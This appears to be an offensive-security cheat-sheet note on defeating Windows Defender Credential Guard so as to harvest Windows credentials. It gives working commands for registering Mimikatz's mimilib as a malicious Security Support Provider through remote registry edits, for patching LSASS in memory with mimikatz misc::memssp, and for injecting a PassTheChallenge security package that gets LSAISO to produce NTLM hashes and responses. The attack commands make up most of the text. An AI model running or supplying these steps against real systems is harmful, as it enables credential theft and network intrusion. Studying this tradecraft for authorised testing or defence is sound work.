---
title: LSASS Dump against Credential Guard
---

[[notes/windows/lsass-dump]] in face of Windows Defender Credential Guard.

When Credential Guard is enabled, credentials are no longer stored in the LSASS process memory, but in the LSAISO process, which is isolated by *Virtualization-based Security* (VBS).
Custom *Security Support Providers* are not blocked.
Credential Guard is enabled by default on Windows 11 ([source](http://web.archive.org/web/20230530211030/https://emptydc.com/2022/06/08/windows-credential-dumping/)).

Check if Credential Guard is enabled.

=== "PowerShell"
    ~~~ ps1
    (Get-ComputerInfo).DeviceGuardSecurityServicesRunning
    ~~~

=== "cmd"
    ~~~ bat
    tasklist.exe /fi "imagename eq lsaiso.exe"
    ~~~

# Security Support Provider (SSP)

Credential Guard can be bypassed by installing a malicious *Security Support Provider*.
The passwords of all future logons are captured in plain text.

## a) Modifying the registry

Upload `mimilib.dll` from Mimikatz to `C:\Windows\System32\mimilib.dll`.

Read installed security packages.

~~~ bash
impacket-reg corp.local/jdoeadm:'passw0rd'@srv01.corp.local query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'Security Packages' -s
~~~

Append `mimilib` to the list.

~~~ bash
impacket-reg corp.local/jdoeadm:'passw0rd'@srv01.corp.local add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'Security Packages' -vd 'kerberos msv1_0 schannel wdigest tspkg pku2u mimilib' -vt REG_MULTI_SZ
~~~

Passwords are written to `C:\Windows\System32\kiwissp.log` after a reboot.

References:

- [Custom SSP](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-custom-ssp)

## b) Patching LSASS

Patch LSASS in memory with [Mimikatz](https://github.com/gentilkiwi/mimikatz).
This might be unstable.
Passwords are written to `C:\Windows\System32\mimilsa.txt` until the next restart.

~~~ bat
.\mimikatz.exe "privilege::debug" "misc::memssp" "exit"
~~~

Alternatively patch LSASS in memory with [CredGuardBypassOffsets](https://github.com/itm4n/Pentest-Windows/tree/main/CredGuardBypassOffsets) or [BypassCredGuard](https://github.com/wh0nsq/BypassCredGuard) to enable [[notes/windows/wdigest-dump]] and cache passwords in clear text from then on.

# Pass the Challenge

First obtain a regular LSASS dump, then parse it with this [PyPyKatz fork](https://github.com/ly4k/Pypykatz).

~~~ bash
./pypykatz.py lsa minidump ./lsass.dmp -p msv
~~~

Then inject a security package into LSASS that provides a communication channel from userspace to LSAISO.
This is implemented in [PassTheChallenge](https://github.com/ly4k/PassTheChallenge).

~~~ bat
.\PassTheChallenge.exe inject .\SecurityPackage.dll
~~~

a) NTLMv1

Retrieve an [[notes/ad/ntlmv1]] response from LSAISO and crack it.

~~~ bat
.\PassTheChallenge.exe nthash %context_handle%:%proxy_info% %encrypted_blob%
~~~

[Internal-Monologue](https://github.com/eladshamir/internal-monologue) implements a similar attack.
It enables NTLMv1 on the host, then injects code into a process of a high value user that opens a connection to an attacker SMB server for capturing.

b) NTLMv2

Use this [Impacket fork](https://github.com/ly4k/Impacket) to print out the NTLM challenge when connecting to a system.

~~~ bash
./psexec.py corp.local/jdoeadm:CHALLENGE@dc01.corp.com
~~~

Submit the challenge to LSAISO to let it calculate the response.

~~~ bat
.\PassTheChallenge.exe challenge %context_handle%:%proxy_info% %encrypted_blob% %challenge%
~~~

Then pass the response back to Impacket.

References:

- [Pass-the-Challenge: Defeating Windows Defender Credential Guard](http://web.archive.org/web/20221229140832/https://scribe.rip/@oliverlyak/pass-the-challenge-defeating-windows-defender-credential-guard-31a892eee22)
